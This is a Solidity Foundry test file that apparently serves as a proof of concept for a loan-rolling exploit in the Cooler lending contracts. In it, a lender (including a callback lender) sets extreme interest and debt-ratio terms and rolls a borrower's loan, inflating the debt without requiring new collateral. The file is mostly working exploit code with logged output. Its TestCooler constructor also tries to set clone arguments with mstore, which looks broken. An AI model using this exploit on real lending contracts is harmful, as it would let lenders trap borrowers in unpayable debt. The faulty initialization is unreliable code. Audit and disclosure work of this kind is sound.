// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import {Test, console} from "forge-std/Test.sol";
import {ERC20} from "solmate/tokens/ERC20.sol";
import {Cooler} from "src/Cooler.sol";
import {CoolerFactory} from "src/CoolerFactory.sol";
import {CoolerCallback} from "src/CoolerCallback.sol";
import {Clone} from "clones/Clone.sol";

// Mock ERC20 for testing
contract MockERC20 is ERC20 {
    constructor(string memory name, string memory symbol, uint8 decimals) ERC20(name, symbol, decimals) {}
    
    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

// Mock CoolerFactory for testing
contract MockCoolerFactory {
    event NewEvent(uint256 indexed id, uint256 indexed eventType, uint256 data);
    
    function newEvent(uint256 id, uint256 eventType, uint256 data) external {
        emit NewEvent(id, eventType, data);
    }
}

// Mock CoolerCallback that implements all required functions
contract MockCoolerCallback is CoolerCallback {
    constructor(address coolerFactory_) CoolerCallback(coolerFactory_) {}
    
    function isCoolerCallback() external pure override returns (bool) {
        return true;
    }
    
    function _onRepay(uint256 loanID_, uint256 amount_) internal override {
        // Mock implementation - do nothing
    }
    
    function _onRoll(uint256 loanID_, uint256 newDebt, uint256 newCollateral) internal override {
        // Mock implementation - do nothing
    }
    
    function _onDefault(uint256 loanID_, uint256 debt, uint256 collateral) internal override {
        // Mock implementation - do nothing
    }
}

// Test implementation of Cooler for testing purposes
contract TestCooler is Cooler {
    constructor(
        address owner_,
        address collateral_,
        address debt_,
        address factory_
    ) {
        // Initialize the immutable arguments using assembly
        assembly {
            // Store owner at offset 0x00
            mstore(0x00, owner_)
            // Store collateral at offset 0x14
            mstore(0x14, collateral_)
            // Store debt at offset 0x28
            mstore(0x28, debt_)
            // Store factory at offset 0x3c
            mstore(0x3c, factory_)
        }
    }
}

contract CoolerExploitTest is Test {
    MockERC20 public collateralToken;
    MockERC20 public debtToken;
    MockCoolerFactory public factory;
    TestCooler public cooler;
    
    address public borrower;
    address public lender;
    
    // Constants for the test
    uint256 constant LOAN_AMOUNT = 1000e18;  // 1000 debt tokens
    uint256 constant INTEREST_RATE = 5e16;   // 5% annual interest
    uint256 constant LOAN_TO_COLLATERAL = 10e18; // 10 debt per 1 collateral
    uint256 constant DURATION = 365 days;   // 1 year
    uint256 constant COLLATERAL_AMOUNT = 100e18; // 100 collateral tokens
    
    function setUp() public {
        // Deploy mock tokens
        collateralToken = new MockERC20("Collateral", "COL", 18);
        debtToken = new MockERC20("Debt", "DEBT", 18);
        factory = new MockCoolerFactory();
        
        // Create addresses
        borrower = makeAddr("borrower");
        lender = makeAddr("lender");
        
        // Deploy Cooler with proper initialization
        cooler = new TestCooler(
            borrower,
            address(collateralToken),
            address(debtToken),
            address(factory)
        );
        
        // Mint tokens to participants
        collateralToken.mint(borrower, COLLATERAL_AMOUNT * 2);
        debtToken.mint(lender, LOAN_AMOUNT * 10);
        
        // Approve tokens
        vm.prank(borrower);
        collateralToken.approve(address(cooler), type(uint256).max);
        
        vm.prank(lender);
        debtToken.approve(address(cooler), type(uint256).max);
    }
    
    function testLoanRollingExploit() public {
        // Step 1: Borrower requests a loan with reasonable terms
        vm.prank(borrower);
        uint256 reqId = cooler.requestLoan(
            LOAN_AMOUNT,
            INTEREST_RATE,
            LOAN_TO_COLLATERAL,
            DURATION
        );
        
        console.log("=== Initial Loan Request ===");
        console.log("Loan Amount:", LOAN_AMOUNT / 1e18);
        console.log("Interest Rate:", INTEREST_RATE / 1e16, "%");
        console.log("Loan-to-Collateral:", LOAN_TO_COLLATERAL / 1e18);
        console.log("Duration:", DURATION / 86400, "days");
        
        // Step 2: Lender clears the request
        vm.prank(lender);
        uint256 loanId = cooler.clearRequest(reqId, false, false);
        
        // Verify initial loan terms
        Cooler.Loan memory loan = cooler.getLoan(loanId);
        uint256 expectedInterest = cooler.interestFor(LOAN_AMOUNT, INTEREST_RATE, DURATION);
        uint256 totalDebt = LOAN_AMOUNT + expectedInterest;
        
        console.log("\n=== Initial Loan Terms ===");
        console.log("Total Debt:", totalDebt / 1e18);
        console.log("Collateral:", loan.collateral / 1e18);
        console.log("Expected Repayment:", totalDebt / 1e18);
        
        // Step 3: Lender provides malicious terms for rolling
        uint256 maliciousRate = 100000e16; // 100,000% interest rate
        uint256 maliciousRatio = 1000e18;  // 1000 debt per 1 collateral
        
        vm.prank(lender);
        cooler.provideNewTermsForRoll(
            loanId,
            maliciousRate,
            maliciousRatio,
            DURATION
        );
        
        console.log("\n=== Malicious Rolling Terms Set ===");
        console.log("New Interest Rate:", maliciousRate / 1e16, "%");
        console.log("New Loan-to-Collateral:", maliciousRatio / 1e18);
        
        // Step 4: Lender rolls the loan with malicious terms
        vm.prank(lender);
        cooler.rollLoan(loanId);
        
        // Verify the exploit results
        Cooler.Loan memory newLoan = cooler.getLoan(loanId);
        
        console.log("\n=== After Malicious Roll ===");
        console.log("New Total Debt:", newLoan.amount / 1e18);
        console.log("Collateral (unchanged):", newLoan.collateral / 1e18);
        
        // Calculate the new interest added
        uint256 newInterest = newLoan.amount - totalDebt;
        console.log("Additional Interest Added:", newInterest / 1e18);
        
        // Step 5: Check if additional collateral was required
        uint256 additionalCollateral = cooler.newCollateralFor(loanId);
        console.log("Additional Collateral Required:", additionalCollateral / 1e18);
        
        // Verify the exploit
        assertTrue(newLoan.amount > totalDebt * 10, "Debt should have increased dramatically");
        assertEq(additionalCollateral, 0, "No additional collateral should be required");
        
        console.log("\n=== EXPLOIT SUCCESSFUL ===");
        console.log("Borrower now owes:", newLoan.amount / 1e18, "debt tokens");
        console.log("For collateral worth:", COLLATERAL_AMOUNT / 1e18, "tokens");
        console.log("Debt-to-Collateral ratio:", (newLoan.amount * 1e18) / COLLATERAL_AMOUNT / 1e18);
        
        // Demonstrate borrower's impossible situation
        uint256 borrowerBalance = debtToken.balanceOf(borrower);
        console.log("Borrower's debt token balance:", borrowerBalance / 1e18);
        assertTrue(borrowerBalance < newLoan.amount, "Borrower cannot afford to repay");
    }
    
    function testNormalRollingBehavior() public {
        // This test shows normal rolling behavior for comparison
        vm.prank(borrower);
        uint256 reqId = cooler.requestLoan(
            LOAN_AMOUNT,
            INTEREST_RATE,
            LOAN_TO_COLLATERAL,
            DURATION
        );
        
        vm.prank(lender);
        uint256 loanId = cooler.clearRequest(reqId, false, false);
        
        // Normal rolling terms (similar to original)
        vm.prank(lender);
        cooler.provideNewTermsForRoll(
            loanId,
            INTEREST_RATE,
            LOAN_TO_COLLATERAL,
            DURATION
        );
        
        vm.prank(lender);
        cooler.rollLoan(loanId);
        
        Cooler.Loan memory newLoan = cooler.getLoan(loanId);
        
        console.log("\n=== Normal Rolling Results ===");
        console.log("New Total Debt:", newLoan.amount / 1e18);
        console.log("Collateral:", newLoan.collateral / 1e18);
        
        // Normal rolling should add reasonable interest
        assertTrue(newLoan.amount < LOAN_AMOUNT * 2, "Normal rolling should not double debt");
    }
    
    function testCallbackLenderExploit() public {
        // Test with a callback lender
        MockCoolerCallback callbackLender = new MockCoolerCallback(address(factory));
        
        // Give callback lender some debt tokens
        debtToken.mint(address(callbackLender), LOAN_AMOUNT * 10);
        vm.prank(address(callbackLender));
        debtToken.approve(address(cooler), type(uint256).max);
        
        // Step 1: Borrower requests a loan
        vm.prank(borrower);
        uint256 reqId = cooler.requestLoan(
            LOAN_AMOUNT,
            INTEREST_RATE,
            LOAN_TO_COLLATERAL,
            DURATION
        );
        
        // Step 2: Callback lender clears the request
        vm.prank(address(callbackLender));
        uint256 loanId = cooler.clearRequest(reqId, false, true);
        
        // Step 3: Callback lender provides malicious terms
        uint256 maliciousRate = 50000e16; // 50,000% interest rate
        uint256 maliciousRatio = 500e18;  // 500 debt per 1 collateral
        
        vm.prank(address(callbackLender));
        cooler.provideNewTermsForRoll(
            loanId,
            maliciousRate,
            maliciousRatio,
            DURATION
        );
        
        // Step 4: Callback lender rolls the loan
        vm.prank(address(callbackLender));
        cooler.rollLoan(loanId);
        
        // Verify the exploit
        Cooler.Loan memory newLoan = cooler.getLoan(loanId);
        uint256 additionalCollateral = cooler.newCollateralFor(loanId);
        
        console.log("\n=== Callback Lender Exploit ===");
        console.log("New Total Debt:", newLoan.amount / 1e18);
        console.log("Additional Collateral Required:", additionalCollateral / 1e18);
        
        assertTrue(newLoan.amount > LOAN_AMOUNT * 10, "Debt should have increased dramatically");
        assertEq(additionalCollateral, 0, "No additional collateral should be required");
    }
}